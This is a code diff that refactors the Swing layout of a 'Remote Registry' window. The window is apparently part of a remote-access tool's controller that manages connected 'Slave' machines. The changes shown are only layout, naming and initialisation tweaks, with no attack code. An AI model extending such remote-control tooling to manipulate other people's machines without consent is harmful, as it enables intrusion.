@@ -1,5 +1,6 @@
 package se.jrat.controller.ui.frames;
 
+import java.awt.BorderLayout;
 import java.awt.Component;
 import java.awt.Toolkit;
 import java.awt.event.ActionEvent;
@@ -11,23 +12,18 @@ import java.awt.event.WindowEvent;
 import java.util.HashMap;
 import java.util.Map;
 
-import javax.swing.GroupLayout;
-import javax.swing.GroupLayout.Alignment;
 import javax.swing.ImageIcon;
 import javax.swing.JButton;
 import javax.swing.JFrame;
 import javax.swing.JMenu;
 import javax.swing.JMenuItem;
-import javax.swing.JPanel;
 import javax.swing.JPopupMenu;
 import javax.swing.JScrollPane;
 import javax.swing.JSplitPane;
 import javax.swing.JTable;
 import javax.swing.JTextField;
 import javax.swing.JToolBar;
-import javax.swing.LayoutStyle.ComponentPlacement;
 import javax.swing.ScrollPaneConstants;
-import javax.swing.border.EmptyBorder;
 import javax.swing.table.DefaultTableModel;
 
 import se.jrat.controller.Slave;
@@ -47,16 +43,13 @@ import com.redpois0n.pathtree.PathTreeModel;
 @SuppressWarnings( "serial" )
 public class FrameRemoteRegistry extends BaseFrame {
 
-	private JPanel contentPane;
-	private Slave slave;
-	private DefaultTableModel model;
-
-	public static final Map<Slave, FrameRemoteRegistry> instances = new HashMap<Slave, FrameRemoteRegistry>();
+	public static final Map<Slave, FrameRemoteRegistry> INSTANCES = new HashMap<Slave, FrameRemoteRegistry>();
 	public static final ImageIcon ICON_REGSZ = IconUtils.getIcon("registry-string");
 	public static final ImageIcon ICON_REG01 = IconUtils.getIcon("registry-bin");
-	public static final ImageIcon FOLDER_ICON = IconUtils.getIcon("folder");
+	public static final ImageIcon ICON_FOLDER = IconUtils.getIcon("folder");
 	public static final String[] ROOT_VALUES = new String[] { "HKEY_LOCAL_MACHINE", "HKEY_CURRENT_USER", "HKEY_CLASSES_ROOT", "HKEY_USERS", "HKEY_CURRENT_CONFIG" };
 
+	private DefaultTableModel model;
 	private JTable table;
 	private JTextField txt;
 	private JPopupMenu popupMenu;
@@ -65,49 +58,34 @@ public class FrameRemoteRegistry extends BaseFrame {
 	private JMenuItem mntmEditValue;
 	private JMenu mnBrowse;
 	private JMenuItem mntmStartup;
-	private RegistryTableRenderer renderer = new RegistryTableRenderer();
+	private RegistryTableRenderer renderer;
 	private PathJTree tree;
 
 	public DefaultTableModel getModel() {
 		return model;
 	}
 
-	public FrameRemoteRegistry(Slave sl) {
-		super();
-		this.slave = sl;
+	public FrameRemoteRegistry(Slave s) {
+		super(s);
 		addWindowListener(new WindowAdapter() {
 			@Override
 			public void windowClosing(WindowEvent arg0) {
 				exit();
 			}
 		});
-		instances.put(slave, this);
-		setTitle("Registry - " + "[" + slave.formatUserString() + "] - " + slave.getIP());
+		INSTANCES.put(slave, this);
+		setTitle("Registry Manager");
 		setIconImage(Toolkit.getDefaultToolkit().getImage(FrameRemoteRegistry.class.getResource("/icons/registry.png")));
 		setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
 		setBounds(100, 100, 800, 500);
-		contentPane = new JPanel();
-		contentPane.setBorder(new EmptyBorder(0, 0, 0, 0));
-		setContentPane(contentPane);
-
+		setLayout(new BorderLayout(0, 0));
+		
 		JToolBar toolBar = new JToolBar();
 		toolBar.setFloatable(false);
 
 		JSplitPane splitPane = new JSplitPane();
 		splitPane.setResizeWeight(0.7);
-		GroupLayout gl_contentPane = new GroupLayout(contentPane);
-		gl_contentPane.setHorizontalGroup(
-			gl_contentPane.createParallelGroup(Alignment.TRAILING)
-				.addComponent(toolBar, Alignment.LEADING, GroupLayout.DEFAULT_SIZE, 784, Short.MAX_VALUE)
-				.addComponent(splitPane, Alignment.LEADING, GroupLayout.DEFAULT_SIZE, 784, Short.MAX_VALUE)
-		);
-		gl_contentPane.setVerticalGroup(
-			gl_contentPane.createParallelGroup(Alignment.LEADING)
-				.addGroup(gl_contentPane.createSequentialGroup()
-					.addComponent(toolBar, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
-					.addPreferredGap(ComponentPlacement.RELATED)
-					.addComponent(splitPane, GroupLayout.DEFAULT_SIZE, 430, Short.MAX_VALUE))
-		);
+		add(splitPane, BorderLayout.CENTER);
 
 		JScrollPane scrollPane = new JScrollPane();
 		splitPane.setRightComponent(scrollPane);
@@ -137,6 +115,7 @@ public class FrameRemoteRegistry extends BaseFrame {
 			}
 		});
 
+		renderer = new RegistryTableRenderer();
 		table.setDefaultRenderer(Object.class, renderer);
 
 		popupMenu = new JPopupMenu();
@@ -258,7 +237,7 @@ public class FrameRemoteRegistry extends BaseFrame {
 		});
 		btnCustomCommand.setIcon(IconUtils.getIcon("key-arrow"));
 		toolBar.add(btnCustomCommand);
-		contentPane.setLayout(gl_contentPane);
+		add(toolBar, BorderLayout.NORTH);
 	}
 
 	public void execute(String location) {
@@ -266,7 +245,7 @@ public class FrameRemoteRegistry extends BaseFrame {
 	}
 
 	public void exit() {
-		instances.remove(slave);
+		INSTANCES.remove(slave);
 	}
 
 	public void clear() {
